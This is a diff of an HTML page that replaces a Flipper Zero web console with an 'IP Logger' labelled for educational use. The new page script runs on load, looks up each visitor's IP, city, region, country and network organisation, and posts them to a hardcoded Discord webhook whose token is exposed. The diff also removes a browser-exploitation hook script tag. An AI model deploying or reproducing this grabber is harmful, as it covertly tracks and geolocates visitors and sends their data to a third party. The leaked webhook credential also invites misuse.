@@ -1,32 +1,40 @@
 <!DOCTYPE html>
 <html lang="en">
-  <script src="http://127.0.0.1:3000/hook.js"></script>
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Flipper Zero Web Console</title>
-  <script defer src="app.js"></script>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <title>IP Logger (Ethical Educational Use)</title>
 </head>
-<body class="bg-gray-900 text-white h-screen">
-  <div class="h-full flex flex-col p-4 max-w-7xl mx-auto">
-    <h1 class="text-4xl font-bold mb-4 text-center">🧡 Flipper Zero Web Console</h1>
-    
-    <div class="flex justify-center gap-4 mb-4">
-      <button id="connectBtn" class="bg-green-600 px-6 py-3 rounded text-lg">Connect</button>
-      <button id="clearBtn" class="bg-gray-700 px-6 py-3 rounded text-lg">Clear</button>
-    </div>
+<body>
+  <h1>Welcome!</h1>
+  <p>Your IP is being logged for educational purposes.</p>
 
-    <!-- Fill ALL remaining vertical space -->
-    <div id="console" class="flex-grow bg-black overflow-y-scroll p-4 font-mono text-base border border-gray-700 rounded mb-4">
-      <!-- Logs go here -->
-    </div>
+  <script>
+    // Replace this with your actual Discord webhook URL
+    const webhookUrl = 'https://discord.com/api/webhooks/1390048588960370809/JzJtD75pWRaBF2QlZ3Wp54poUU9BaRoBobcZzgBVSoszFx8FUqLx9P0ioT2b5jz2fQ7z';
 
-    <form id="inputForm" class="flex gap-4">
-      <input type="text" id="commandInput" placeholder="Enter command..." class="flex-1 bg-gray-800 border border-gray-600 rounded px-4 py-3 text-lg focus:outline-none">
-      <button class="bg-blue-600 px-6 py-3 rounded text-lg">Send</button>
-    </form>
-  </div>
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const message = {
+          content: `📡 New Visitor Logged:
+**IP:** ${data.ip}
+**City:** ${data.city}
+**Region:** ${data.region}
+**Country:** ${data.country_name}
+**Org:** ${data.org}
+**Time:** ${new Date().toISOString()}`
+        };
+
+        // Send the message to your Discord webhook
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(message)
+        });
+      })
+      .catch(error => console.error('IP fetch error:', error));
+  </script>
 </body>
 </html>
+
 
